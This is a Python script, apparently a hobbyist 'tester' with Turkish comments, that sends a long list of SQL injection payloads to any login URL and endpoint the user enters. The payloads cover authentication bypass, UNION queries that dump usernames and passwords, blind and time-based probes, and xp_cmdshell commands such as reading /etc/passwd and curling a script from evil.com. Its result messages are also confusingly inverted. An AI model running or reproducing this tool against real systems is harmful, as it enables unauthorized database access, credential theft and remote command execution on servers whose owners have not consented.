"""
⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡴⠋⠉⡊⢁⠀⠀⢬⠀⠉⠋⠈⠥⠤⢍⡛⠒⠶⣄⡀⠀⠀⠀
⠀⠀⠀⠀⣾⠥⠀⠀⠊⢭⣾⣿⣷⡤⠀⣠⡀⡅⢠⣶⣮⣄⠉⠢⠙⡆⠀⠀
⠀⠀⣠⡾⣁⡨⠴⠢⡤⣿⣿⣿⣿⣿⠸⡷⠙⣟⠻⣯⣿⣟⣃⣠⡁⢷⣄⠀
⠀⡼⡙⣜⡕⠻⣷⣦⡀⢙⠝⠛⡫⢵⠒⣀⡀⠳⡲⢄⣀⢰⣫⣶⡇⡂⠙⡇
⢸⡅⡇⠈⠀⠀⠹⣿⣿⣷⣷⣾⣄⣀⣬⣩⣷⠶⠧⣶⣾⣿⣿⣿⡷⠁⣇⡇
⠀⠳⣅⢀⢢⠡⠀⡜⢿⣿⣿⡏⠑⡴⠙⣤⠊⠑⡴⠁⢻⣿⣿⣿⠇⢀⡞⠀
⠀⠀⠘⢯⠀⡆⠀⠐⡨⡻⣿⣧⣤⣇⣀⣧⣀⣀⣷⣠⣼⣿⣿⣿⠀⢿⠀⠀
⠀⠀⠀⠈⢧⡐⡄⠀⠐⢌⠪⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢸⠀⠀
⠀⠀⠀⠀⠀⠙⢾⣆⠠⠀⡁⠘⢌⠻⣿⣿⠻⠹⠁⢃⢹⣿⣿⣿⡇⡘⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠷⢴⣄⠀⢭⡊⠛⠿⠿⠵⠯⡭⠽⣛⠟⢡⠃⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⠬⣥⣀⡀⠀⢀⠀⠀⣠⡲⢄⡼⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠓⠒⠒⠒⠋⠉⠀⠀⠀


AS I AM A JUNIOR LEVEL PROGRAMMER, DO NOT TAKE MY MISTAKES TOO SERIOUSLY, PLEASE CONTACT ME WITH MY MISTAKES -s3loc_


DISCLAIMER OF LIABILITY:

The author(s) of this code accept no responsibility or liability for any damages or issues arising from the use or misuse of this code. Use this code at your own risk. By using this code, 
you agree that the author(s) are not responsible for any consequences or harm that may occur, whether direct or indirect, as a result of using this code. 

This code is provided "as is" without any warranties or guarantees. The user assumes all responsibility for ensuring the suitability of this code for their specific needs and requirements.
"""







import requests

class InjectionFlawsTester:
    def __init__(self, base_url, endpoint):
        self.base_url = base_url
        self.endpoint = endpoint

    def test_sql_injection(self, payload):
        # Test verisi ile isteği hazırla
        test_url = f"{self.base_url}{self.endpoint}"
        data = {
            'username': payload,
            'password': 'testpassword'  # Bu örnekte sabit bir şifre kullanılıyor
        }

        print(f"[INFO] SQL Enjeksiyon Testi Başlatılıyor: {payload}")
        
        # POST isteği gönder
        response = requests.post(test_url, data=data)
        
        # Yanıtı işleme
        return self.process_response(response)

    def process_response(self, response):
        if response.status_code == 500:
            print("[SUCCESS] SQL enjeksiyonu başarısız oldu. Sunucu hatası alındı.")
        elif "error" in response.text.lower():
            print("[SUCCESS] SQL enjeksiyonu başarısız oldu. Hata mesajı alındı.")
        elif "welcome" in response.text.lower() or "admin" in response.text.lower():
            print(f"[ERROR] SQL enjeksiyonu başarılı olabilir. Yanıt: {response.text}")
        else:
            print(f"[INFO] Yanıt kodu: {response.status_code}, Yanıt: {response.text}")

    def run_tests(self, payloads):
        for payload in payloads:
            print(f"\n[INFO] Test ediliyor: {payload}")
            self.test_sql_injection(payload)

if __name__ == "__main__":
    # Kullanıcıdan URL ve endpoint bilgilerini al
    base_url = input("Test edilecek URL'yi girin (örnek: http://example.com): ").strip()
    endpoint = input("Endpoint'i girin (örnek: /login): ").strip()

    # SQL enjeksiyon test payload'ları
    payloads = [
        # Basit SQL Enjeksiyonlar
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' AND 1=1",
        "' AND 1=1 --",
        "' AND 1=1 /*",
        "' OR 'a'='a",
        "' OR 'x'='x",
        "' OR '1'='1' AND '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR '1'='1'/*",
        "' OR '1'='1'--",
        "' OR 1=1#",
        "' AND '1'='1'",
        "' AND '1'='1' --",
        "' AND '1'='1' /*",
        "' AND 1=1 #",
        "' AND 1=1--",
        "' AND 1=1 /*",
        "' OR 'x'='x' --",
        "' OR '1'='1' AND '1'='2'",
        
        # Union SQL Enjeksiyonları
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION ALL SELECT NULL, username, password FROM users --",
        "' UNION SELECT username, password FROM users WHERE '1'='1' --",
        "' UNION SELECT null, table_name, column_name FROM information_schema.columns WHERE table_schema=database() --",
        "' UNION SELECT null, COUNT(*), CONCAT(username, 0x3a, password) FROM users --",
        "' UNION SELECT null, username, password FROM users LIMIT 1 OFFSET 1 --",
        "' UNION SELECT 1, table_name FROM information_schema.tables --",
        "' UNION SELECT NULL, version() --",
        "' UNION SELECT NULL, CURRENT_USER() --",
        "' UNION SELECT NULL, @@version --",
        "' UNION SELECT NULL, database() --",
        "' UNION SELECT NULL, table_schema FROM information_schema.schemata --",
        "' UNION SELECT NULL, table_name FROM information_schema.tables --",
        "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT NULL, GROUP_CONCAT(user()) FROM mysql.user --",
        
        # Error Based SQL Enjeksiyonları
        "' AND 1=CONVERT(int, @@version) --",
        "' AND 1=2 --",
        "' AND 1=(SELECT COUNT(*) FROM users) --",
        "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(username, 0x3a, password) FROM users GROUP BY username) x) --",
        "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
        "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) --",
        "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
        "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) --",
        "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --",
        "' AND (SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END) --",
        
        # Blind SQL Enjeksiyonları
        "' AND IF(1=1, SLEEP(5), 0) --",
        "' AND IF(1=2, SLEEP(5), 0) --",
        "' AND IF(EXISTS(SELECT * FROM users WHERE username = 'admin'), SLEEP(5), 0) --",
        "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
        "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) --",
        "' AND IF(1=1, 1, 0) --",
        "' AND IF(1=2, 1, 0) --",
        "' AND IF(EXISTS(SELECT * FROM users WHERE username='admin'), 1, 0) --",
        
        # Time-Based SQL Enjeksiyonları
        "' OR IF(1=1, BENCHMARK(1000000, MD5('test')), 0) --",
        "' OR IF(1=2, BENCHMARK(1000000, MD5('test')), 0) --",
        "' OR IF(EXISTS(SELECT * FROM users WHERE username = 'admin'), BENCHMARK(1000000, MD5('test')), 0) --",
        "' OR IF(EXISTS(SELECT * FROM users), BENCHMARK(1000000, MD5('test')), 0) --",
        "' OR IF(1=1, SLEEP(10), 0) --",
        "' OR IF(1=2, SLEEP(10), 0) --",
        "' OR IF(EXISTS(SELECT * FROM users WHERE username='admin'), SLEEP(10), 0) --",
        "' OR IF(1=1, SLEEP(5), 0) --",
        
        # Komut Enjeksiyonları
        "'; EXEC xp_cmdshell('dir') --",
        "'; EXEC xp_cmdshell('whoami') --",
        "'; EXEC xp_cmdshell('net user') --",
        "'; EXEC xp_cmdshell('cat /etc/passwd') --",
        "'; EXEC xp_cmdshell('ls -la') --",
        "'; EXEC xp_cmdshell('echo %username%') --",
        "'; EXEC xp_cmdshell('curl http://evil.com/malicious-script') --",
        "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
        
        # Error Handling
        "' AND 1=1 ORDER BY 1--",
        "' AND 1=1 ORDER BY 2--",
        "' AND 1=1 ORDER BY 3--",
        "' AND 1=1 GROUP BY CONCAT(username,0x3a,password)--",
        "' AND 1=1 HAVING 1=1 --",
        "' AND 1=1 HAVING COUNT(*) > 1 --",
        "' AND 1=1 ORDER BY 4--",
        "' AND 1=1 ORDER BY 5--",
        "' AND 1=1 ORDER BY 6--",
        
        # Encoding Techniques
        "' AND 1=1 UNION SELECT NULL, username, password FROM users --",
        "' AND 1=1 UNION SELECT NULL, username, password FROM users LIMIT 1 --",
        "' AND 1=1 UNION SELECT NULL, username, password FROM users ORDER BY 1--",
        "' AND 1=1 UNION SELECT NULL, username, password FROM users HAVING 1=1--",
        "' AND 1=1 UNION SELECT NULL, username, password FROM users OFFSET 1 LIMIT 1 --",
        "' AND 1=1 UNION SELECT NULL, CONCAT(username, 0x3a, password) FROM users --",
        "' AND 1=1 UNION SELECT NULL, HEX(username), HEX(password) FROM users --",
        "' AND 1=1 UNION SELECT NULL, CHAR(66,66), CHAR(67,67) --",
        
        # Nested Queries
        "' AND EXISTS (SELECT 1 FROM users WHERE username='admin') --",
        "' AND EXISTS (SELECT 1 FROM information_schema.tables WHERE table_schema=database()) --",
        "' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users') --",
        "' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE column_name='password') --",
        "' AND EXISTS (SELECT 1 FROM information_schema.schemata WHERE schema_name='public') --",
        "' AND EXISTS (SELECT 1 FROM mysql.db WHERE db='test') --",
        
        # Boolean Based Blind SQL Injection
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND 1=1 AND 'a'='a --",
        "' AND 1=1 AND 'a'='b --",
        "' AND 1=1 AND (SELECT COUNT(*) FROM users) > 0 --",
        "' AND 1=1 AND (SELECT COUNT(*) FROM users) = 0 --",
        "' AND 1=1 AND (SELECT 1 FROM dual WHERE 1=1) --",
        "' AND 1=1 AND (SELECT 1 FROM dual WHERE 1=2) --",
        
        # Malicious Input
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1/*",
        "' OR 1=1#",
        "' OR 1=1' --",
        "' OR 1=1'/*",
        "' OR 1=1' --",
        "' OR 1=1' /*",
        "' OR 1=1#",
        "' OR 1=1'--",
        "' OR 1=1'/*",
    ]

    tester = InjectionFlawsTester(base_url, endpoint)
    tester.run_tests(payloads)
